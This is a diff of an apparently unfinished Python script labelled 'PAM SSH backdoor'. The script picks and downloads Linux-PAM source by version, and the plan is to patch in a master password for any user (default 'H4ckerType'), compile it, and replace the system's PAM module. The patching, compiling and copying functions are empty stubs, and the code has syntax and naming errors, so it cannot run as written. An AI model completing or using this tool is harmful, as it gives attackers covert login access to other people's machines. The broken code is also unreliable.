@@ -1,6 +1,7 @@
 #!/usr/bin/python3
 #PAM SSH backdoor
 #PASSWORD,no,Master password for any user
+#PAM_VERSION,no,Set version of PAM if if you know it
 #END
 
 import os
@@ -14,47 +15,58 @@ def get_pam_version():
 def get_pam_source_code(pam_version):
     
     if '1.1.6' in pam_version:
-        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.1.6.zip -o /tmp/pam_source_116.zip')
-    if '1.1.7' in pam_version:
-        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_1_7.zip -o /tmp/pam_source_117.zip')
-    if '1.1.8' in pam_version:
-        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_1_8.zip -o /tmp/pam_source_118.zip')
-    if '1.2.0' in pam_version:
-        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_2_0.zip -o /tmp/pam_source_120.zip')
-    if '1.2.1' in pam_version:
-        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_2_1.zip -o /tmp/pam_source_121.zip')
-    if '1.3.0' in pam_version:
-        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1.3.0.zip -o /tmp/pam_source_130.zip')
-    
-    if '1.3.1' in pam_version:
-        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.3.1.zip -o /tmp/pam_source.zip')
-    if '1.4.0' in pam_version:
-        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.3.1.zip -o /tmp/pam_source.zip')
-    if '1.5.0' in pam_version:
-        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.3.1.zip -o /tmp/pam_source.zip')
-    if '1.5.1' in pam_version:
-        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.3.1.zip -o /tmp/pam_source.zip')
-    
+        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.1.6.tar.gz -o /tmp/pam_source_116.tar.gz')
+    elif '1.1.7' in pam_version:
+        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_1_7.tar.gz -o /tmp/pam_source_117.tar.gz')
+    elif '1.1.8' in pam_version:
+        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_1_8.tar.gz -o /tmp/pam_source_118.tar.gz')
+    elif '1.2.0' in pam_version:
+        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_2_0.tar.gz -o /tmp/pam_source_120.tar.gz')
+    elif '1.2.1' in pam_version:
+        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_2_1.tar.gz -o /tmp/pam_source_121.tar.gz')
+    elif '1.3.0' in pam_version:
+        os.system('wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1.3.0.tar.gz -o /tmp/pam_source_130.tar.gz') 
+    elif '1.3.1' in pam_version:
+        os.system('wget https://github.com/linux-pam/linux-pam/releases/download/v1.3.1/Linux-PAM-1.3.1.tar.xz -o /tmp/pam_source_131.tar.xz')
+    elif '1.4.0' in pam_version:
+        os.system('wget https://github.com/linux-pam/linux-pam/releases/download/v1.4.0/Linux-PAM-1.4.0.tar.xz -o /tmp/pam_source_140.tar.xz')
+    elif '1.5.0' in pam_version:
+        os.system('wget https://github.com/linux-pam/linux-pam/releases/download/v1.5.0/Linux-PAM-1.5.0.tar.xz -o /tmp/pam_source_150.tar.xz')
+    elif '1.5.1' in pam_version:
+        os.system('wget https://github.com/linux-pam/linux-pam/releases/download/v1.5.1/Linux-PAM-1.5.1.tar.xz -o /tmp/pam_source_151.tar.xz')
+    elif: #get latest stable
+        pass
+
+def put_backdoor_into_code(password, path_to_source_code):
     pass
 
-def put_into_code(password):
+def compile_modified_pam(path_to_source_code):
     pass
 
-def compile():
+def create_backup_of_original_pam():
     pass
 
-def create_backdoor(password):
+def copy_backdoored_pam(path_to_backdoored_pam):
+    pass
+
+def create_backdoor(password, path_to_source_code):
     if password == "":
         password = "H4ckerType"
 
-    put_into_code(password)
-    compile()
+    put_backdoor_into_code(password, path_to_source_code)
+    compile_modified_pam(path_to_source_code)
     
     pass
 
 def main(arguments):
-    get_pam_source_code(get_pam_version)
+    if not arguments[1]:
+        path_to__source_code = get_pam_source_code(get_pam_version)
+    else:
+        path_to_source_code = get_pam_source_code(arguments[1])
+    
+    create_backdoor(arguments[0], path_to_source_code)
+    create_backup_of_original_pam()
+    copy_backdoored_pam()
 
-    pass
 
 print(get_pam_version())
